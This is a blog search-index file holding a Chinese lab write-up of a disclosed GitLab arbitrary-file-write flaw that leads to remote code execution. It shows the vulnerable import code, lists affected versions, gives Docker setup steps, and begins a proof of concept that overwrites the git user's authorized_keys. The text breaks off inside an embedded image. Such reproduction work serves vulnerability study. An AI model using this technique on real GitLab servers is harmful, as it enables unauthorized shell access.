<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>Gitlab远程代码执行漏洞</title>
      <link href="/2018/05/30/Gitlab_rce/"/>
      <url>/2018/05/30/Gitlab_rce/</url>
      <content type="html"><![CDATA[<h3 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h3><p>首发于<a href="https://xz.aliyun.com/t/2366" target="_blank" rel="noopener">先知论坛</a>， 近期Hackerone公开了Gitlab的任意文件写入，导致远程代码执行漏洞，实践一波。<br><a id="more"></a></p><h3 id="0x01漏洞描述"><a href="#0x01漏洞描述" class="headerlink" title="0x01漏洞描述"></a>0x01漏洞描述</h3><p>app/services/projects/gitlab_project_import_service.rb<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># This service is an adapter used to for the GitLab Import feature, and</span></span><br><span class="line"><span class="comment"># creating a project from a template.</span></span><br><span class="line"><span class="comment"># The latter will under the hood just import an archive supplied by GitLab.</span></span><br><span class="line"><span class="class"><span class="keyword">module</span> <span class="title">Projects</span></span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">GitlabProjectsImportService</span></span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">execute</span></span></span><br><span class="line">      FileUtils.mkdir_p(File.dirname(import_upload_path))</span><br><span class="line">      FileUtils.copy_entry(file.path, import_upload_path)</span><br><span class="line"></span><br><span class="line">      Gitlab::ImportExport::ProjectCreator.new(params[<span class="symbol">:namespace_id</span>],</span><br><span class="line">                                               current_user,</span><br><span class="line">                                               import_upload_path,</span><br><span class="line">                                               params[<span class="symbol">:path</span>]).execute</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tmp_filename</span></span></span><br><span class="line">      <span class="string">"<span class="subst">#&#123;SecureRandom.hex&#125;</span>_<span class="subst">#&#123;params[<span class="symbol">:path</span>]&#125;</span>"</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>import_upload_path将未过滤的参数params[:path]添加到gitlab上传目录，导致存在目录遍历，此外由于文件内容没有限制，最终导致任意内容写入任意文件。由于默认gitlab创建并启动了git账户，该账户默认目录为/var/opt/gitlab/，修改.ssh/authorized_keys文件为攻击者的公钥，即可以git用户身份成功登录服务器，从而导致命令执行。</p><p><strong>影响版本</strong>：</p><ul><li>GitLab CE and EE 8.9.0 - 9.5.10</li><li>GitLab CE and EE 10.0.0 - 10.1.5</li><li>GitLab CE and EE 10.2.0 - 10.2.5</li><li>GitLab CE and EE 10.3.0 - 10.3.3</li></ul><h3 id="0x02漏洞利用复现"><a href="#0x02漏洞利用复现" class="headerlink" title="0x02漏洞利用复现"></a>0x02漏洞利用复现</h3><h4 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h4><p><strong>利用docker搭建gitlab</strong><br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name gitlab -<span class="selector-tag">p</span> <span class="number">80</span>:<span class="number">80</span> -<span class="selector-tag">p</span> <span class="number">443</span>:<span class="number">443</span> -<span class="selector-tag">p</span> <span class="number">2222</span>:<span class="number">22</span>  gitlab/gitlab-ce:<span class="number">10.2</span>.<span class="number">4</span>-ce.<span class="number">0</span></span><br></pre></td></tr></table></figure></p><p><strong>修改配置文件</strong><br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it gitlab /bin/bash</span><br><span class="line">nano /etc/gitlab/gitlab.rb</span><br><span class="line"></span><br><span class="line"><span class="meta"># 去掉gitlab的注释并修改对应ip</span></span><br><span class="line">external_url <span class="string">'192.168.1.100'</span></span><br><span class="line"><span class="meta">#重新载入配置文件</span></span><br><span class="line">gitlab-ctl reconfigure</span><br><span class="line"><span class="meta"># 访问对应ip，第一次需要设置密码，并新建用户</span></span><br><span class="line">http:<span class="comment">//192.168.1.100/</span></span><br></pre></td></tr></table></figure></p><p><strong>本地利用ssh-keygen生成公私钥对（用于攻击替换和登录）</strong></p><h4 id="2-POC及利用"><a href="#2-POC及利用" class="headerlink" title="2. POC及利用"></a>2. POC及利用</h4><ol><li>登录gitlab-&gt;<a href="http://192.168.1.100/projects/new" target="_blank" rel="noopener">创建项目</a>-&gt;Import project-&gt;GitLab Import-&gt;选择文件<br><img src="data:image/png;base64,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